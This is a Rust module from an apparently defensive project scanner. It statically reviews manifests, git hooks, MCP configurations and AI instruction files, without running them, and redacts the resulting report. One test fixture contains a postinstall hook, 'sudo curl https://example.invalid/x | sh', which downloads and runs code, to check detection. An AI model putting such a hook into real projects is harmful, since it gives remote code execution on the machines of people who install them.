//! Explicit read-only project review over retained file identities. Discovery
//! never runs Git, package managers, hooks, MCP servers, or project tooling.
use std::collections::{BTreeSet, HashMap};
use std::path::{Component, Path, PathBuf};
use std::time::{Duration, Instant};

use serde::Serialize;
use serde_json::{json, Value};

use crate::ecosystem_scan::{self, ManifestKind};
use crate::mcp_lock::{self, McpTransport};
use crate::policy::Policy;
use crate::repo_hooks::{self, HookProvider};
use crate::threatdb::ThreatDb;
use crate::util::{ContainedAtomicFile, ContainedFilePreimage, OpenRegularError};
use crate::verdict::Finding;

pub const MAX_FILES: usize = 64;
pub const MAX_FILE_BYTES: u64 = 256 * 1024;
pub const MAX_TOTAL_BYTES: u64 = 4 * 1024 * 1024;
pub const MAX_DEPENDENCIES: usize = 500;
pub const MAX_FINDINGS: usize = 128;
const MAX_DURATION: Duration = Duration::from_secs(10);
pub const DEFAULT_PATHS: &[&str] = &[
    "package.json",
    "package-lock.json",
    "Cargo.toml",
    "go.mod",
    "requirements.txt",
    "pyproject.toml",
    "poetry.lock",
    "Gemfile",
    "AGENTS.md",
    "CLAUDE.md",
    ".cursorrules",
    ".github/copilot-instructions.md",
    ".mcp.json",
    ".cursor/mcp.json",
    ".vscode/mcp.json",
    ".envrc",
    "Makefile",
    "justfile",
    ".git/config",
    ".git/hooks/pre-commit",
    ".git/hooks/pre-push",
    ".git/hooks/post-checkout",
    ".git/hooks/post-merge",
    ".husky/pre-commit",
    ".husky/pre-push",
    ".pre-commit-config.yaml",
    "lefthook.yml",
    "Taskfile.yml",
];

#[derive(Clone, Serialize)]
pub struct FileReview {
    pub path: String,
    pub observation_id: String,
    pub status: &'static str,
    pub inspected_bytes: u64,
    pub categories: Vec<&'static str>,
    pub gaps: Vec<&'static str>,
    pub findings: Vec<Finding>,
    pub dependency_count: usize,
    pub dependencies: Vec<Value>,
    pub servers: Vec<Value>,
}

struct Witness {
    path: PathBuf,
    capability: ContainedAtomicFile,
    preimage: Option<ContainedFilePreimage>,
    row: usize,
}

/// Original bytes and native identities remain private. The public UUID is a
/// report reference, not a digest of a command, secret, or project configuration.
pub struct ProjectReview {
    id: String,
    root: PathBuf,
    root_anchor: ContainedAtomicFile,
    files: Vec<FileReview>,
    witnesses: Vec<Witness>,
    inspected_bytes: u64,
    read_work_bytes: u64,
    captured_at: String,
    captured: Instant,
    default_selection: bool,
    threat_db_available: bool,
}

fn safe_relative(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 512
        && !value.contains(['\\', ':', '\0'])
        && Path::new(value).components().count() <= 12
        && Path::new(value)
            .components()
            .all(|part| matches!(part, Component::Normal(_)))
}

impl ProjectReview {
    pub fn capture(
        root: &Path,
        selected: &[String],
        policy: &Policy,
        db: Option<&ThreatDb>,
    ) -> Result<Self, String> {
        if !root.is_absolute()
            || root
                .components()
                .any(|part| matches!(part, Component::ParentDir))
        {
            return Err("project review requires an absolute, unambiguous root".into());
        }
        let default_selection = selected.is_empty();
        let paths: Vec<_> = if default_selection {
            DEFAULT_PATHS
                .iter()
                .map(|value| (*value).to_string())
                .collect()
        } else {
            selected.to_vec()
        };
        if paths.len() > MAX_FILES
            || paths.iter().any(|path| !safe_relative(path))
            || paths.iter().collect::<BTreeSet<_>>().len() != paths.len()
        {
            return Err(
                "select at most 64 unique project-relative files without parent traversal or links"
                    .into(),
            );
        }
        let root_anchor = ContainedAtomicFile::prepare(root, &root.join("package.json"), false)
            .map_err(|_| "project root cannot be retained without following links")?;
        let mut review = Self {
            id: uuid::Uuid::new_v4().to_string(),
            root: root.into(),
            root_anchor,
            files: Vec::new(),
            witnesses: Vec::new(),
            inspected_bytes: 0,
            read_work_bytes: 0,
            captured_at: chrono::Utc::now().to_rfc3339(),
            captured: Instant::now(),
            default_selection,
            threat_db_available: db.is_some(),
        };
        let mut dependencies = 0;
        let mut findings = 0;
        for path in paths {
            let mut row = FileReview {
                path: path.clone(),
                observation_id: uuid::Uuid::new_v4().to_string(),
                status: "uninspected",
                inspected_bytes: 0,
                categories: Vec::new(),
                gaps: Vec::new(),
                findings: Vec::new(),
                dependency_count: 0,
                dependencies: Vec::new(),
                servers: Vec::new(),
            };
            if review.captured.elapsed() >= MAX_DURATION
                || review.read_work_bytes >= MAX_TOTAL_BYTES
            {
                row.gaps.push("review_work_limit");
                review.files.push(row);
                continue;
            }
            let target = root.join(&path);
            let capability = match ContainedAtomicFile::prepare(root, &target, false) {
                Ok(value) => value,
                Err(_) => {
                    row.status = "unavailable";
                    row.gaps.push("parent_absent_unreadable_or_linked");
                    review.files.push(row);
                    continue;
                }
            };
            let cap = MAX_FILE_BYTES.min(MAX_TOTAL_BYTES - review.read_work_bytes);
            if !capability
                .shares_retained_root(&review.root_anchor)
                .unwrap_or(false)
            {
                row.status = "unavailable";
                row.gaps.push("project_root_changed");
                review.files.push(row);
                continue;
            }
            let bytes = capability.read_capped(cap);
            if matches!(&bytes, Ok(_) | Err(OpenRegularError::NotFound)) {
                let preimage = capability
                    .observed_preimage()
                    .map_err(|_| "cannot retain inspected identity")?;
                review.witnesses.push(Witness {
                    path: target,
                    capability,
                    preimage,
                    row: review.files.len(),
                });
            }
            match bytes {
                Ok(bytes) => {
                    row.inspected_bytes = bytes.len() as u64;
                    review.inspected_bytes += row.inspected_bytes;
                    review.read_work_bytes += row.inspected_bytes;
                    match std::str::from_utf8(&bytes) {
                        Ok(text) => {
                            row.status = "inspected";
                            analyze(&mut row, text, root, policy, db, &mut dependencies);
                            if row.findings.len() > MAX_FINDINGS.saturating_sub(findings) {
                                row.findings.truncate(MAX_FINDINGS.saturating_sub(findings));
                                row.gaps.push("finding_limit");
                            }
                            findings += row.findings.len();
                        }
                        Err(_) => {
                            row.status = "unsupported";
                            row.gaps.push("non_utf8_content");
                        }
                    }
                }
                Err(OpenRegularError::NotFound) => row.status = "absent",
                Err(_) => {
                    row.status = "unavailable";
                    row.gaps.push("read_limit_nonregular_link_or_io_failure");
                    // Charge the attempted bounded read, including failures.
                    review.read_work_bytes = review.read_work_bytes.saturating_add(cap + 1);
                }
            }
            review.files.push(row);
        }
        Ok(review)
    }

    pub fn id(&self) -> &str {
        &self.id
    }

    /// Compare only live retained objects; no pathname or serialized report
    /// can supply the service's original project identity.
    pub fn shares_retained_root(&self, anchor: &ContainedAtomicFile) -> bool {
        self.root_anchor
            .shares_retained_root(anchor)
            .unwrap_or(false)
    }

    /// Revalidate the retained identities without rerunning analyzers. The caller
    /// supplies freshly captured privacy rules on every display/export request.
    pub fn projection(&self, patterns: &[String]) -> Result<Value, String> {
        let expired = self.captured.elapsed() >= Duration::from_secs(600);
        let root_changed = !self
            .root_anchor
            .matches_visible(&self.root, &self.root.join("package.json"))
            .unwrap_or(false);
        let mut rows = self.files.clone();
        for witness in &self.witnesses {
            if root_changed
                || !witness
                    .capability
                    .matches_visible(&self.root, &witness.path)
                    .unwrap_or(false)
                || witness
                    .capability
                    .verify_observed_preimage(&witness.preimage)
                    .is_err()
            {
                rows[witness.row].status = "changed_since_inspection";
            }
        }
        let changed = rows
            .iter()
            .filter(|row| row.status == "changed_since_inspection")
            .count();
        let compiled = crate::redact::CompiledCustomPatterns::new_silent(patterns);
        for row in &mut rows {
            row.path = crate::redact::redact_sanitize_redact_with_compiled(&row.path, &compiled);
            crate::redact::redact_findings_with_compiled(&mut row.findings, &compiled);
            for dependency in &mut row.dependencies {
                for field in ["name", "declared_version"] {
                    if let Some(value) = dependency.get_mut(field) {
                        crate::redact::redact_json_strings(value, &compiled);
                    }
                }
                for factor in dependency["risk"]["factors"]
                    .as_array_mut()
                    .into_iter()
                    .flatten()
                {
                    for field in ["label", "detail"] {
                        if let Some(value) = factor.get_mut(field) {
                            crate::redact::redact_json_strings(value, &compiled);
                        }
                    }
                }
            }
            for server in &mut row.servers {
                for field in ["name", "destination"] {
                    if let Some(value) = server.get_mut(field) {
                        crate::redact::redact_json_strings(value, &compiled);
                    }
                }
            }
        }
        let mut value = json!({"schema_version":1,"kind":"project_review","report_id":self.id,
            "captured_at":self.captured_at,"expired":expired,"root_changed":root_changed,"changed_files":changed,
            "executed":false,"execution_permitted":false,"complete_runtime_analysis":false,
            "selection":if self.default_selection {"known_project_surfaces"} else {"explicit_files"},
            "coverage":{"selected_files":rows.len(),"inspected_bytes":self.inspected_bytes,"read_work_budget_charged_bytes":self.read_work_bytes,
                "file_limit":MAX_FILES,"per_file_bytes":MAX_FILE_BYTES,"total_byte_limit":MAX_TOTAL_BYTES,
                "recursive_discovery":false,"unselected_paths":"not_inspected","outside_root":"not_inspected",
                "registry_network":"not_requested","threat_db_available":self.threat_db_available,
                "executed_hooks_mcp_or_project_tooling":false,"runtime_behavior":"unavailable"},
            "notice":"Static observations of selected files, not proof the project is safe. Nested workspaces, external hook paths, user-level MCP configuration and runtime effects require separate review.",
            "files":rows,"presentation_incomplete":false});
        // Typed IDs/states/rules are protocol. Only the original free-form
        // fields above cross DLP, before any complete entry is withheld.
        let mut withheld = 0;
        for row in value["files"].as_array_mut().into_iter().flatten() {
            if serde_json::to_vec_pretty(row)
                .map_err(|_| "cannot bound project file report")?
                .len()
                > 32 * 1024
            {
                let replacement = json!({"path":row["path"],"observation_id":row["observation_id"],"status":row["status"],"presentation":"withheld_output_limit"});
                *row = replacement;
                withheld += 1;
            }
        }
        if serde_json::to_vec_pretty(&value)
            .map_err(|_| "cannot bound project report")?
            .len()
            > 256 * 1024
        {
            value["files"] = json!([]);
            value["presentation_incomplete"] = true.into();
            withheld = self.files.len();
        }
        if withheld > 0 {
            value["presentation_incomplete"] = true.into();
        }
        value["omitted_file_details"] = withheld.into();
        Ok(value)
    }
}

fn hook(row: &mut FileReview, provider: HookProvider, name: &str, body: &str) {
    row.categories.push("hook_static");
    for item in repo_hooks::classify_body(name, provider, &row.path, body) {
        row.findings.push(Finding {
            rule_id: item.rule_id,
            severity: item.severity,
            title: format!("{}: {}", item.name, item.rule_id),
            description: item.detail,
            evidence: vec![],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }
    row.gaps.push("hook_runtime_effects_unavailable");
}

fn analyze(
    row: &mut FileReview,
    text: &str,
    root: &Path,
    policy: &Policy,
    db: Option<&ThreatDb>,
    dependencies: &mut usize,
) {
    let path = PathBuf::from(&row.path);
    let name = path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or("");
    if let Some(kind) = ManifestKind::from_file_name(name) {
        row.categories.push("dependencies");
        // Reject ambiguous JSON interpretation before reusing a manifest parser.
        if name.ends_with(".json") && mcp_lock::parse_json_no_duplicates(text).is_err() {
            row.gaps.push("malformed_or_duplicate_manifest");
            return;
        }
        if let Some(parsed) = ecosystem_scan::parse_manifest_detailed(kind, text) {
            row.dependency_count = parsed.deps.len();
            if !parsed.includes.is_empty() {
                row.gaps.push("requirements_includes_not_followed");
            }
            if !parsed.unsupported_sources.is_empty() {
                row.gaps.push("non_registry_dependency_source");
            }
            let request = ecosystem_scan::ScanRequest {
                root,
                db,
                online: ecosystem_scan::OnlineMode::Off,
                is_allowlisted: &|_, _| false,
                mode: ecosystem_scan::ScanMode::Manifests,
                installed_max_entries: 0,
                policy: Some(policy),
            };
            let mut cache = HashMap::new();
            for dep in parsed
                .deps
                .iter()
                .take(MAX_DEPENDENCIES.saturating_sub(*dependencies))
            {
                let assessment =
                    ecosystem_scan::assess_dependency(dep, &row.path, &request, &mut cache);
                row.findings
                    .extend(ecosystem_scan::findings_for(&assessment, policy));
                row.dependencies.push(json!({"name":dep.name,"ecosystem":dep.ecosystem.to_string(),"declared_version":dep.version.as_version_str(),
                    "risk":{"score":assessment.risk.score,"level":assessment.risk.risk_level,"threat_db_missing":assessment.risk.threat_db_missing,"factors":assessment.risk.factors},"content_inspected":false}));
                *dependencies += 1;
            }
            if row.dependencies.len() < row.dependency_count {
                row.gaps.push("dependency_limit");
            }
            row.gaps
                .push("resolved_artifacts_and_dependency_code_not_inspected");
        } else {
            row.gaps.push("malformed_or_unsupported_manifest");
        }
        if name == "package.json" {
            if let Ok(value) = mcp_lock::parse_json_no_duplicates(text) {
                if let Some(scripts) = value.get("scripts").and_then(Value::as_object) {
                    for (script, body) in scripts.iter().take(32) {
                        if let Some(body) = body.as_str() {
                            hook(row, HookProvider::PackageJson, script, body);
                        } else {
                            row.gaps.push("invalid_script_value");
                        }
                    }
                    if scripts.len() > 32 {
                        row.gaps.push("script_limit");
                    }
                }
            }
        }
    }
    if crate::rules::aifile::classify(Some(&path)).is_some() {
        row.categories.push("ai_configuration");
        row.findings
            .extend(crate::rules::aifile::check(text, Some(&path)));
    }
    if name == ".mcp.json" || name == "mcp.json" {
        row.categories.push("mcp_configuration");
        row.gaps.push("mcp_tools_and_runtime_not_inspected");
        match mcp_lock::parse_mcp_config(text, &row.path) {
            Some(servers) => {
                if servers.len() > 32 {
                    row.gaps.push("mcp_server_limit");
                }
                for server in servers.into_iter().take(32) {
                    let (transport, destination) = match server.transport {
                        McpTransport::Url { url, .. } => ("url", url),
                        McpTransport::Stdio { command, .. } => ("stdio", command),
                        McpTransport::Unknown => ("unknown", String::new()),
                    };
                    row.servers.push(json!({"name":server.name,"transport":transport,"destination":destination,"connection_attempted":false,"tools_verified":false}));
                }
            }
            None => row
                .gaps
                .push("malformed_ambiguous_or_unsupported_mcp_configuration"),
        }
    }
    let provider = if row.path.starts_with(".git/hooks/") {
        Some(HookProvider::Git)
    } else if row.path.starts_with(".husky/") {
        Some(HookProvider::Husky)
    } else if name == ".envrc" {
        Some(HookProvider::Direnv)
    } else {
        None
    };
    if let Some(provider) = provider {
        hook(row, provider, name, text);
    }
    if matches!(
        name,
        "Makefile"
            | "justfile"
            | "Justfile"
            | "Taskfile.yml"
            | "lefthook.yml"
            | ".pre-commit-config.yaml"
    ) {
        row.categories.push("automation_configuration");
        row.gaps.push("automation_dsl_not_evaluated");
    }
    if row.path == ".git/config" {
        row.categories.push("repository_configuration");
        row.gaps
            .push("external_git_config_hooks_and_filters_not_followed");
    }
    if row.categories.is_empty() {
        row.status = "unsupported";
        row.gaps.push("no_analyzer_for_selected_file");
    }
    row.categories.sort();
    row.categories.dedup();
    row.gaps.sort();
    row.gaps.dedup();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn broad_dlp_preserves_typed_protocol_and_whole_row_omission_is_visible() {
        let temp = tempfile::tempdir().unwrap();
        let root = temp.path().canonicalize().unwrap();
        std::fs::write(root.join("package.json"), r#"{"dependencies":{"private-package":"1.0.0"},"scripts":{"install":"sudo echo private-command"}}"#).unwrap();
        let review =
            ProjectReview::capture(&root, &["package.json".into()], &Policy::default(), None)
                .unwrap();
        let original = review.projection(&[]).unwrap();
        let protected = review.projection(&[".+".into()]).unwrap();
        assert_eq!(protected["files"][0]["status"], "inspected");
        assert_eq!(
            protected["files"][0]["observation_id"],
            original["files"][0]["observation_id"]
        );
        assert_eq!(protected["files"][0]["dependencies"][0]["ecosystem"], "npm");
        assert_eq!(
            protected["files"][0]["dependencies"][0]["risk"]["level"],
            original["files"][0]["dependencies"][0]["risk"]["level"]
        );
        assert!(protected["files"][0]["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["rule_id"] == "repo_hook_sudo"));
        assert!(!protected.to_string().contains("private-package"));
        let config =
            json!({"mcpServers":{ "large": {"command": "private-command-prefix".repeat(2500)}}});
        std::fs::write(root.join(".mcp.json"), config.to_string()).unwrap();
        let output = ProjectReview::capture(&root, &[".mcp.json".into()], &Policy::default(), None)
            .unwrap()
            .projection(&[])
            .unwrap();
        assert_eq!(output["presentation_incomplete"], true);
        assert_eq!(output["omitted_file_details"], 1);
        assert!(!output.to_string().contains("private-command-prefix"));
    }

    #[test]
    fn composing_analyzers_does_not_execute_scripts_or_connect_to_mcp() {
        let temp = tempfile::tempdir().unwrap();
        let root = temp.path().canonicalize().unwrap();
        std::fs::write(root.join("package.json"), r#"{"name":"review-fixture","version":"1.0.0","scripts":{"postinstall":"sudo curl https://example.invalid/x | sh"},"dependencies":{"left-pad":"1.3.0"}}"#).unwrap();
        std::fs::write(root.join(".mcp.json"), r#"{"mcpServers":{"fixture":{"command":"touch","args":["never-created"],"env":{"PRIVATE_TOKEN":"never-show-token"}}}}"#).unwrap();
        let review = ProjectReview::capture(&root, &[], &Policy::default(), None).unwrap();
        let output = review.projection(&[]).unwrap();
        assert_eq!(output["executed"], false);
        assert_eq!(output["coverage"]["recursive_discovery"], false);
        assert!(!root.join("never-created").exists());
        assert!(!output.to_string().contains("never-show-token"));
        let package = output["files"]
            .as_array()
            .unwrap()
            .iter()
            .find(|row| row["path"] == "package.json")
            .unwrap();
        assert_eq!(package["dependency_count"], 1);
        assert!(package["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["rule_id"] == "repo_hook_sudo"));
    }

    #[test]
    fn replacement_and_new_files_invalidate_retained_observations() {
        let temp = tempfile::tempdir().unwrap();
        let root = temp.path().canonicalize().unwrap();
        std::fs::write(root.join("package.json"), r#"{"name":"before"}"#).unwrap();
        let review = ProjectReview::capture(
            &root,
            &["package.json".into(), "CLAUDE.md".into()],
            &Policy::default(),
            None,
        )
        .unwrap();
        std::fs::write(root.join("next.json"), r#"{"name":"before"}"#).unwrap();
        std::fs::rename(root.join("next.json"), root.join("package.json")).unwrap();
        std::fs::write(root.join("CLAUDE.md"), "new instruction").unwrap();
        let output = review.projection(&[]).unwrap();
        assert_eq!(output["changed_files"], 2);
        assert_eq!(output["execution_permitted"], false);
    }

    #[test]
    fn oversized_malformed_unsupported_and_nested_inputs_are_honest() {
        let temp = tempfile::tempdir().unwrap();
        let root = temp.path().canonicalize().unwrap();
        std::fs::write(
            root.join("package.json"),
            r#"{"dependencies":{},"dependencies":{"surprise":"*"}}"#,
        )
        .unwrap();
        std::fs::write(
            root.join("AGENTS.md"),
            vec![b'x'; MAX_FILE_BYTES as usize + 1],
        )
        .unwrap();
        std::fs::write(root.join("requirements.txt"), "-r outside.txt\n").unwrap();
        let selected = vec![
            "package.json".into(),
            "AGENTS.md".into(),
            "requirements.txt".into(),
            "unknown.txt".into(),
        ];
        std::fs::write(root.join("unknown.txt"), "not a supported format").unwrap();
        let output = ProjectReview::capture(&root, &selected, &Policy::default(), None)
            .unwrap()
            .projection(&[])
            .unwrap();
        assert!(output
            .to_string()
            .contains("malformed_or_duplicate_manifest"));
        assert_eq!(output["files"][1]["status"], "unavailable");
        assert!(output
            .to_string()
            .contains("requirements_includes_not_followed"));
        assert_eq!(output["files"][3]["status"], "unsupported");
        assert!(
            ProjectReview::capture(&root, &["../outside".into()], &Policy::default(), None)
                .is_err()
        );
        assert!(ProjectReview::capture(
            &root,
            &vec!["package.json".into(); 65],
            &Policy::default(),
            None
        )
        .is_err());
    }

    #[cfg(unix)]
    #[test]
    fn file_and_parent_symlinks_are_never_followed() {
        let temp = tempfile::tempdir().unwrap();
        let root = temp.path().canonicalize().unwrap();
        let outside = tempfile::tempdir().unwrap();
        std::fs::write(
            outside.path().join("package.json"),
            r#"{"name":"outside-never-read"}"#,
        )
        .unwrap();
        std::os::unix::fs::symlink(
            outside.path().join("package.json"),
            root.join("package.json"),
        )
        .unwrap();
        std::os::unix::fs::symlink(outside.path(), root.join("linked")).unwrap();
        let report = ProjectReview::capture(
            &root,
            &["package.json".into(), "linked/package.json".into()],
            &Policy::default(),
            None,
        )
        .unwrap()
        .projection(&[])
        .unwrap();
        assert!(!report.to_string().contains("outside-never-read"));
        assert!(report["files"]
            .as_array()
            .unwrap()
            .iter()
            .all(|file| file["status"] == "unavailable"));
    }

    #[test]
    fn projection_uses_fresh_dlp_and_does_not_publish_content_digests() {
        let temp = tempfile::tempdir().unwrap();
        let root = temp.path().canonicalize().unwrap();
        std::fs::write(root.join(".mcp.json"),r#"{"mcpServers":{"project-sensitive-name":{"url":"https://example.org/private-destination"}}}"#).unwrap();
        let review =
            ProjectReview::capture(&root, &[".mcp.json".into()], &Policy::default(), None).unwrap();
        let original = review.projection(&[]).unwrap();
        assert!(original.to_string().contains("project-sensitive-name"));
        let protected = review
            .projection(&[
                "project-sensitive-name".into(),
                "private-destination".into(),
            ])
            .unwrap();
        assert!(!protected.to_string().contains("project-sensitive-name"));
        assert!(!protected.to_string().contains("private-destination"));
        assert!(!protected.to_string().contains("sha256"));
    }
}
